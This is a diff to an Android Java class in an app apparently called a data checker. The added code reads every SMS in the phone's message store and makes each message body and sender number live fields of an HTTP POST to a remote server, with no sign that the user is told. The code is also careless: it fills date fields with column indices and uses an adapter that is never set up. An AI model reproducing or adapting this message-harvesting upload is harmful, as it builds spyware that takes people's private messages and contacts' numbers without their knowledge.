@@ -1,6 +1,18 @@
 package com.example.androiddatachecker;
 
+import android.app.Application;
+import android.content.ContentResolver;
+import android.content.Context;
+import android.content.pm.PackageManager;
+import android.database.Cursor;
+import android.net.Uri;
 import android.os.AsyncTask;
+import android.support.v4.content.ContextCompat;
+import android.view.View;
+import android.widget.AdapterView;
+import android.widget.ArrayAdapter;
+import android.widget.ListView;
+import android.widget.Toast;
 
 import org.apache.http.HttpEntity;
 import org.apache.http.HttpResponse;
@@ -16,10 +28,51 @@ import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
 
-public class Check {
+public class Check extends Application{
+
+    // private static MainActivity inst;
+    ArrayList<String> smsMessagesList = new ArrayList<String>();
+    ListView smsListView;
+    ArrayAdapter arrayAdapter;
+    //private
+
+    public static Context contextOfApplication;
+
+    public static Context getContextOfApplication() {
+        return contextOfApplication;
+    }
+
+    public void SaveUserMessage() {
+        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
+
+            ContentResolver contentResolver = getContentResolver();
+            Cursor smsInboxCursor = contentResolver.query(Uri.parse("content://sms/"), null, null, null, null);
+            int indexBody = smsInboxCursor.getColumnIndex("body");
+            int indexAddress = smsInboxCursor.getColumnIndex("address");
+            if (indexBody < 0 || !smsInboxCursor.moveToFirst()) return;
+            do {
+                // Toast.makeText(getContextOfApplication(), "Entrée dans Do", Toast.LENGTH_LONG).show();
+
+                //InsertData(smsInboxCursor.getString(indexAddress),smsInboxCursor.getString(indexBody));
+                InsertData(1, 458, smsInboxCursor.getString(indexBody),
+                        smsInboxCursor.getString(indexAddress), "20h",
+                        "h", Integer.toString(smsInboxCursor.getColumnIndex("address")),
+                        Integer.toString(smsInboxCursor.getColumnIndex("address")), Integer.toString(smsInboxCursor.getColumnIndex("address")),
+                        "nouvelle date", "actif");
+
+            } while (smsInboxCursor.moveToNext());
+            arrayAdapter.clear();
+            //InsertData("papa","pa@mail.com");
+        }
+    }
+
+    public void updateList(final String smsMessage) {
+        arrayAdapter.insert(smsMessage, 0);
+        arrayAdapter.notifyDataSetChanged();
+    }
 
 
-    public static void InsertData( final int id_user, final int id_message, final String contenu_message, final String type_messag,
+    public static void InsertData(final int id_user, final int id_message, final String contenu_message, final String type_messag,
                                    final String dat_message, final String heure_message,final String correspondant_number,
                                    final String correspondant_name,final String dat_ins_message,final String heure_ins_message,
                                    final String etat) {
@@ -33,32 +86,18 @@ public class Check {
 
                 List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
 
-                /*nameValuePairs.add(new BasicNameValuePair("name", NameHolder));
-                nameValuePairs.add(new BasicNameValuePair("email", EmailHolder));*/
 
-                /*nameValuePairs.add(new BasicNameValuePair("id_user",Integer.toString(id_user)));
+                nameValuePairs.add(new BasicNameValuePair("id_user",Integer.toString(id_user)));
                 nameValuePairs.add(new BasicNameValuePair("id_message",Integer.toString(id_message)));
                 nameValuePairs.add(new BasicNameValuePair("contenu_message",contenu_message));
-                nameValuePairs.add(new BasicNameValuePair("type_messag",type_messag));
+                nameValuePairs.add(new BasicNameValuePair("type_message",type_messag));
                 nameValuePairs.add(new BasicNameValuePair("dat_message",dat_message));
                 nameValuePairs.add(new BasicNameValuePair("heure_message",heure_message));
                 nameValuePairs.add(new BasicNameValuePair("correspondant_number",correspondant_number));
                 nameValuePairs.add(new BasicNameValuePair("correspondant_name",correspondant_name));
                 nameValuePairs.add(new BasicNameValuePair("dat_ins_message",dat_ins_message));
                 nameValuePairs.add(new BasicNameValuePair("heure_ins_message",heure_ins_message));
-                nameValuePairs.add(new BasicNameValuePair("etat",etat));*/
-
-                nameValuePairs.add(new BasicNameValuePair("id_user","1"));
-                nameValuePairs.add(new BasicNameValuePair("id_message","254"));
-                nameValuePairs.add(new BasicNameValuePair("contenu_message","pava va auc hamp"));
-                nameValuePairs.add(new BasicNameValuePair("type_messag","inbox"));
-                nameValuePairs.add(new BasicNameValuePair("dat_message","4521"));
-                nameValuePairs.add(new BasicNameValuePair("heure_message","4782"));
-                nameValuePairs.add(new BasicNameValuePair("correspondant_number","452hg"));
-                nameValuePairs.add(new BasicNameValuePair("correspondant_name","khcb"));
-                nameValuePairs.add(new BasicNameValuePair("dat_ins_message","45,nshj"));
-                nameValuePairs.add(new BasicNameValuePair("heure_ins_message","dbjs"));
-                nameValuePairs.add(new BasicNameValuePair("etat","actif"));
+                nameValuePairs.add(new BasicNameValuePair("etat",etat));
 
                 try {
                     HttpClient httpClient = new DefaultHttpClient();
